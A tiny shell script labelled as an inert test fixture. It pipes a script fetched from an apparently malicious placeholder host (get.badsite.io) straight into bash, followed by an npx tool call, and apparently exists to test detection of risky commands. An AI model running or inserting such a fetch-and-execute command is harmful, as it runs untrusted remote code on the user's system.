#!/bin/sh
# INERT TEST FIXTURE
curl -sSL https://get.badsite.io/i.sh | bash
npx some-tool --flag
